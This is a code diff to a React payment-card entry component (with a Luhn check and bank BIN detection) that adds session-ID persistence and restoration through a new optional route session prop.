@@ -7,6 +7,7 @@ import { ConfigMissing } from "@/components/demo/ConfigMissing";
 import { createBrowserSupabaseClient } from "@/lib/supabase/client";
 import { stepToPath } from "@/lib/session-routes";
 import { useSettings } from "@/contexts/SettingsContext";
+import { getStoredActiveSessionId, persistActiveSession } from "@/lib/session-id-client";
 
 function luhnCheck(value: string): boolean {
   const digits = value.replace(/\D/g, "");
@@ -91,12 +92,14 @@ function detectBank(number: string): BankBin | null {
 
 type Props = {
   sessionId: string;
+  routeSessionId?: string;
 };
 
-export function CardClient({ sessionId }: Props) {
+export function CardClient({ sessionId: initialSessionId, routeSessionId }: Props) {
   const router = useRouter();
   const supabase = useMemo(() => createBrowserSupabaseClient(), []);
   const { settings, loading: settingsLoading } = useSettings();
+  const [sessionId, setSessionId] = useState(initialSessionId);
   const [number, setNumber] = useState("");
   const [expiry, setExpiry] = useState("");
   const [cvc, setCvc] = useState("");
@@ -108,6 +111,18 @@ export function CardClient({ sessionId }: Props) {
     input: "app-input mt-1 w-full px-3 py-2",
     submit: "app-btn w-full rounded-xl py-3 text-sm shadow-md disabled:opacity-60",
   };
+
+  useEffect(() => {
+    if (initialSessionId) {
+      setSessionId(initialSessionId);
+      persistActiveSession(initialSessionId, routeSessionId);
+      return;
+    }
+    const stored = getStoredActiveSessionId();
+    if (stored) {
+      setSessionId(stored);
+    }
+  }, [initialSessionId, routeSessionId]);
 
   useEffect(() => {
     let cancelled = false;
